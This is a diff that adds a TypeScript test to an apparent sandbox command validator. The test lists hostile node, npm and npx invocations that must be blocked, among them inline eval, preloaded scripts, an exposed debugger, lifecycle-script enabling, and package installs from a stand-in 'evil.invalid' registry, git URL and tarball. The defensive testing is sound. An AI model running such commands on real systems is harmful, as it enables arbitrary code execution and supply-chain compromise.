@@ -322,3 +322,37 @@ test('Adversarial: Cross-tenant symlink escape and .env/.docker.sock traversal a
     fs.rmSync(root, { recursive: true, force: true });
   }
 });
+
+test('Adversarial: Sandbox parsed command validator blocks node -e/-r/--inspect, npm script/registry/source smuggling, npx -p, and absolute paths', async () => {
+  const { validateParsedCommand } = await import('./runtime/sandbox');
+  const blockedPayloads: string[][] = [
+    ['node', '-e', 'process.exit(0)'],
+    ['node', '--eval=console.log(1)'],
+    ['node', '-p', 'process.env'],
+    ['node', '-r', './evil.cjs', 'index.js'],
+    ['node', '--import=./evil.mjs', 'index.js'],
+    ['node', '--inspect=0.0.0.0:9229', 'index.js'],
+    ['node', '/tmp/outside.js'],
+    ['npm', 'install', 'lodash', '--ignore-scripts=false'],
+    ['npm', 'install', 'lodash', '--foreground-scripts'],
+    ['npm', 'install', 'lodash', '--registry=https://evil.invalid'],
+    ['npm', 'install', 'file:../other'],
+    ['npm', 'install', 'git+https://evil.invalid/pkg.git'],
+    ['npm', 'install', 'https://evil.invalid/malicious.tgz'],
+    ['npx', '-p', 'evil-pkg', 'tsc'],
+    ['npx', '--package=evil-pkg', 'eslint'],
+    ['npx', '-c', 'id'],
+  ];
+  for (const tokens of blockedPayloads) {
+    const res = validateParsedCommand(tokens);
+    assert.equal(res.allowed, false, `Payload MUST be blocked: ${tokens.join(' ')}`);
+  }
+
+  // Legitimate workspace commands remain allowed
+  assert.equal(validateParsedCommand(['node', '-v']).allowed, true);
+  assert.equal(validateParsedCommand(['node', '--check', 'src/app.js']).allowed, true);
+  assert.equal(validateParsedCommand(['npm', 'ci', '--no-audit', '--ignore-scripts']).allowed, true);
+  assert.equal(validateParsedCommand(['npm', 'install', 'zod']).allowed, true);
+  assert.equal(validateParsedCommand(['npx', 'tsc', '--noEmit']).allowed, true);
+});
+
